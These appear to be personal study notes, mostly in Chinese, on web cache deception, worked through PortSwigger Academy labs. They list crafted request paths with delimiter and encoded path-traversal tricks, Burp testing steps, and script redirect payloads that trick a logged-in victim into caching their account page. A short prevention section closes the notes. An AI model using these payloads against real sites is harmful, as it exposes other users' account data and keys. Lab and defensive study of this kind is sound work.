# Web cache deception attacks
- Goal : 存在一個快取規則來儲存以.js結尾的請求的回應
- 靜態目錄規則: /static/ or /assets/
- 檔案名稱規則: robots.txt or favicon.ico
- 專注於支援GET、HEAD或OPTIONS方法的端點
- 建構一個惡意 URL
- cache buster
	- Burp extension : Param miner > Settings > Add dynamic cachebuster
	- 向路徑添加查詢字串並在每次發送請求時進行更改來更改鍵
	- Burp 現在會為您發出的每個請求添加唯一的查詢字串。
	- 您可以在「Logger 」標籤中查看新增的查詢字串
	- Cache-Control header
 
## Exploiting path mapping
 Lab : https://0a86005804fbe54880ed3f7400d6000d.web-security-academy.net/ <br>
  (Burp Repeater)<br>
Request:
- change /my-account/ to /my-account/abc.js
- add X-Cache: miss 
- add Cache-Control: max-age=30 
Response:
- X-Cache chnage to hit -- > X-Cache: hit  <br>

Create 惡意 website (html)
- <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
- After others login , we can access this website , get /my-account/wcd.js to get key  <br>

Reference : 
- X-Cache: miss : 此回應不是從快取提供
- X-Cache: hit : 該請求來自快取
- Cache-Control: max-age=30 : 如果回應已被緩存，則應將其儲存 30 秒

## Exploiting delimiter discrepancies
- 保留字元 「./\=<>?+&*;:"{}|^`#」
- 分隔符號 URL  [?]
- 分隔符號 Java Spring [;]
- 分隔符號 Ruby on Rails [.]
- 分隔符號 OpenLiteSpeed  [%00]
	- 編碼字元 [%00]
	- 如果快取使用 Akamai 或 Fastly，它會將%00和之後的所有內容解釋為路徑
 - 使用分隔符號差異，為快取伺服器（而非來源伺服器）檢視的路徑新增靜態副檔名  <br>

1. 在目標終端節點的 URL 中新增任意字串 :
    - /settings/users/list --> /settings/users/listaaa
2. 添加一個可能的分隔符
    - /settings/users/list;aaa
    -  如果回應與基本回應相同，則表示該;字元用作分隔符
    -  如果它將對路徑的回應與任意字串匹配，則表示該; 字元不用作分隔符

Lab : https://0ab0001f040cfc2be566501900290032.web-security-academy.net/  <br>
  (Burp Intrude) 
  - GET /my-account&&abc HTTP/2
  - GET /my-account;abc.js HTTP/2 <br>
  
Reference : 
- Careful decoding discrepancies
- URL decode error 
- static directory cache
  - /static、/assets、/scripts、/images

## Exploiting normalization by the origin server
- 建立路徑遍歷攻擊載荷
- /static/..%2fprofile
- 測試來源伺服器如何規範化 URL 路徑
	- POST : 修改/profile為/aaa/..%2fprofile
   	- 傳回設定檔訊息 --> 被解釋為/profile
   	- 傳回404 --> 解釋為/aaa/..%2fprofile
- 例如/aaa/..%2fassets/js/stockCheck.js
	- 如果回應不再被緩存 --> 存在基於/assets前綴的快取規則
   	- 仍然被緩存 --> /assets/js/stockCheck.js
- /assets/..%2fjs/stockCheck.js
  	- 如果回應不再被緩存 --> 存在基於/assets前綴的快取規則
  	- 仍然被緩存 --> /assets/..%2fjs/stockCheck.js

- /assets/aaa
  	- 如果回應仍然被緩存 --> 快取規則是基於/assets前綴的

- /<static-directory-prefix>/..%2f<dynamic-path
	- /assets/..%2fprofile

- /resources/..%2fYOUR-RESOURCE
  	-  404回應 => X-Cache: miss
  	-  ReSend => X-Cache: hit
  	-  確認存在基於/resources前綴的靜態目錄快取規則
- https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd

## Exploiting cache server normalization for web cache deception
- 如果快取伺服器解析編碼的點段，但原始伺服器不解析
  	- /<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>
	- /profile%2f%2e%2e%2fstatic
   	- 快取將路徑解釋為：/static
   	- 原始伺服器將路徑解釋為：/profile%2f%2e%2e%2fstatic
   	- /profile;%2f%2e%2e%2fstatic
   	- 快取將路徑解釋為：/static
   	- 原始伺服器將路徑解釋為：/profile
   	
- Intruder :　#， 、?、%23和%3f
- /my-account?abc.js
- /aaa/..%2fmy-accouut
- /my-account?%2f%2e%2e%2fresources
- <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</script>

## Exploiting file name cache rules
- Get 常見文件 :  /robots.txt /index.html /favicon.ico
- /profile%2f%2e%2e%2findex.html
	- 如果回應被緩存 --> /index.html
 	- 回應未被緩存 --> /profile%2f%2e%2e%2findex.html

## Preventing web cache deception vulnerabilities
- 使用Cache-Control
- 使用指令no-store + 設定private
- 啟動 CDN 針對 Web 快取欺騙攻擊的所有保護措施
- 例如，Cloudflare 的快取欺騙防護 (Cache Deception Armor)





   
